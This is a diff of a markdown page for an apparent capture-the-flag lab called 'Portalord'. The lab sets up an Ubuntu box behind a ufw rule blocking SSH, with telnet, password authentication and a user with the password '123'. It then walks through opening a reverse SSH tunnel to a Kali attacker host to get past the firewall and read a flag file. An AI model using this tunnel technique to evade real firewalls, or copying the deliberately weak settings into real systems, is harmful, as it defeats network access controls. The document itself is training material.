@@ -16,33 +16,39 @@ title: Portalord
 </div>
 
 ---
-# 1 using remote ssh
-using remote ssh to connect back to a students localhost and get around ufw rules set up in the environment.
+# 1 remote ssh
+Use remote ssh to connect back to a localhost and get around ufw rules set up in the environment. This is helpful when firewall rules do not allow access to port 22 from the outside.
 
 
 ### On the ssh-closed-box (ubuntu)
 Set up the ufw wirewalls to block all traffic to port 22
 <div class="scroll-box">
 sudo ufw deny 22
+sudo ufw allow 23
 sudo ufw enable
 </div> 
 
-turn password authentication on for the ubuntu box
-#### `sed...`
+Turn password authentication on for the ssh-closed-box.
+#### `sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh`
 
-create a file that is only accessable to an ssh session by setting a "read only by owner" 
+Create a file that is only accessable to an ssh session by setting a "read only by owner" 
 <div class="scroll-box">
 echo "insert a flag here" > /home/ubuntu/ssh_flag.txt
 chmod 600 /home/ubuntu/ssh_flag.txt
 </div> 
 chmod permissions: Read (r=4), Write (w=2), Execute (x=1)
+
 first int is the owner
+
 second int is the group
+
 third int is others
+
 so 600 = 4+2 for the owner and 0 for group and 0 for everyone else
 
 Create a user that can only access telnet specific files
 #### `sudo adduser teluser`
+- select a simple password (123)
 
 set limited permissions for teluser
 #### `sudo nano /usr/local/bin/telnet_shell.sh`
@@ -65,16 +71,21 @@ Install telnet if needed:
 sudo apt update && sudo apt install telnet -y
 </div>   
 
+Turn on your ability to reverse ssh with a password:
+#### `sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && sudo systemctl restart ssh`
+
 now telnet into the ssh-closed-box
 #### `telnet x.x.x.x`
 
 now bind a local high port to local 22
-<div class="scroll-box">
-ssh -N -R 2222:localhost:22 kali@your.kali.ip.addr.
-</div>  
 
-if it appears to "hang" you have an open connection
-now from a differnt terminal on you kali localhost
+ssh -N -R 2222:localhost:22 kali@your.kali.ip.addr.
+
+-N means --no-shell, -R means:--remote-port-forward
+
+If it appears to "hang" you have an open connection
+
+Now from a differnt terminal on you kali localhost
 ####'ssh -p2222 ubuntu@ssh.closed.box.ip
 
 go and find your flag
